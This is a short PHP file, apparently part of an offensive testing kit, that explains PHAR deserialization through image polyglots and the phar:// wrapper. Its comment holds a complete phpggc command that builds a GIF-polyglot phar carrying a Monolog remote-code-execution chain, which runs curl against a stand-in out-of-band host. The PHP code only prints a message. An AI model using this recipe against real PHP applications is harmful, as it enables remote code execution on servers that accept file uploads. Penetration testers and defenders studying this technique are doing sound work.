<?php
/*
  Safe PoC -> x8bitranjit
  PHAR polyglot template - INERT text file (not a valid phar by itself).
  WHAT THIS DEMONSTRATES: PHP phar deserialization needs only a file whose
  stub contains __HALT_COMPILER(); - the marker survives inside GIF/JPEG/PDF
  polyglots, so ANY uploaded image can become a phar archive. Trigger =
  any file op on phar://<uploaded> (file_exists/getimagesize/fopen).

  BUILD THE REAL ONE (authorized targets only):
    phpggc -p phar --fast-destruct -pj 'GIF89a' -o evil.gif Monolog/RCE1 system 'curl http://YOUR-OOB-HOST.example.invalid/phar'
    (PHPGGC builds a VALID phar with your chain - this text shows the shape)

  STUB SHAPE (what polyglots must preserve):
    <?php __HALT_COMPILER(); ?>

  KIT CROSS-REF: DESER-008 (phar deser), UPL-007 (polyglots), LFI-012 (phar:// wrapper).
*/
echo "Safe PoC -> x8bitranjit\n";
echo "This is the INERT template - build the real phar with PHPGGC (see comment).\n";
